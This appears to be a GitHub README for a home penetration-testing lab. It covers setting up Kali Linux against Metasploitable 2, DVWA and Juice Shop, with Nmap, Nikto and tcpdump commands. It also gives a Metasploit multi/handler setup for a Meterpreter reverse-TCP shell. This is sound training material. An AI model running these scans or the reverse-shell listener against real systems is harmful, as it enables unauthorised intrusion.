# Home Lab Setup for Vulnerability Assessment and Penetration Testing

This project involves building and configuring a home lab environment to practice penetration testing techniques. By simulating real-world vulnerabilities, this lab helps in gaining hands-on experience in identifying, exploiting, and mitigating vulnerabilities in web applications and networks.

## Overview

The lab setup includes multiple vulnerable virtual machines (VMs) and uses popular security tools like Nmap, Burp Suite, Metasploit, and Wireshark to perform vulnerability assessments and penetration testing. This environment replicates common vulnerabilities such as SQL Injection, Cross-Site Scripting (XSS), and insecure network services.

## Objectives

- Create a home lab for learning and practicing penetration testing.
- Simulate a real-world network with vulnerable systems.
- Use industry-standard tools to assess and exploit vulnerabilities.
- Document the findings and provide mitigation techniques.

## Lab Components

- **Virtualization Platform:** VirtualBox
- **Virtual Machines (VMs):**
  - **Attacker Machine:** Kali Linux
  - **Vulnerable Systems:** Metasploitable 2, OWASP Juice Shop, DVWA (Damn Vulnerable Web App)

### Tools and Technologies

- **Penetration Testing Tools:** 
  - Burp Suite
  - Nmap
  - Metasploit
  - Nikto
  - OWASP ZAP
  - SQLMap
- **Network Monitoring Tools:**
  - Wireshark
  - Tcpdump
- **Operating Systems:** Kali Linux, Metasploitable 2, OWASP Juice Shop (Docker-based)
- **Scripting Language:** Python
- **Database:** MySQL

## Lab Setup

1. **Install VirtualBox:**
   Download and install VirtualBox to create and manage virtual machines.

2. **Create Virtual Machines:**
   - Kali Linux: Download and set up Kali Linux as the attacker machine.
   - Metasploitable 2: Download this vulnerable VM for network-based vulnerability exploitation.
   - OWASP Juice Shop: Use Docker to set up this intentionally vulnerable web application.
   - DVWA: Install and configure DVWA for testing common web vulnerabilities.

3. **Network Configuration:**
   - Set up a **bridged network** in VirtualBox to allow the attacker machine to communicate with target machines.
   - Verify network connectivity by pinging target VMs from the Kali Linux machine.

## Attack Scenarios
-------------------------------------------------------------------------------------------------------------------------------

### 1. **Vulnerability Scanning**

- **Nmap:** Scan the target machines for open ports and services.
  
  ```bash
  nmap -sV -p- [target IP]
Nikto: Perform a web vulnerability scan against the target web applications.

bash:
nikto -h [target IP or URL]
2. Exploitation
Metasploit: Exploit vulnerabilities in Metasploitable 2 to gain shell access.

bash:
msfconsole
use exploit/multi/handler
set payload linux/x86/meterpreter/reverse_tcp
set LHOST [your attacker IP]
exploit
Burp Suite: Identify and exploit SQL Injection and XSS vulnerabilities on OWASP Juice Shop and DVWA.

3. Network Traffic Analysis
Wireshark/Tcpdump: Capture and analyze network traffic during attacks.

bash:
tcpdump -i eth0 -w traffic_capture.pcap
Key Outcomes:
Identifying Vulnerabilities: Discovered common web vulnerabilities such as SQL Injection, XSS, and weak credentials.

Exploitation Techniques: Gained access to target machines using Metasploit and manual web exploitation techniques.

Mitigation Strategies: Suggested fixes like input validation, secure password policies, and firewall configuration.


Challenges Faced
Network Connectivity: Solved issues with bridged network configuration between virtual machines.

Firewall Rules: Adjusted firewall rules on the virtual machines to allow necessary traffic.

Lessons Learned:
Gained hands-on experience with network configuration and troubleshooting.
Developed a deeper understanding of web application vulnerabilities and mitigation strategies.
Improved proficiency in using industry-standard penetration testing tools.
Future Work
Extend the lab by adding more vulnerable machines and new scenarios.
Automate vulnerability scans and report generation using Python scripts.
Repository Contents
setup.md: Detailed instructions on setting up the virtual machines and network.
attack_scenarios.md: Step-by-step guide on performing vulnerability assessments and exploitation.
screenshots/: Folder containing screenshots from the attack scenarios.
scripts/: Custom scripts used during penetration testing.
How to Use This Lab
Clone the repository:

Follow the instructions in the setup.md file to create and configure the lab environment.

Use the attack_scenarios.md to conduct vulnerability assessments and penetration tests.

Contact
Name: Dhatchina Moorthy G
Email: dhatchu9797@gmail.com
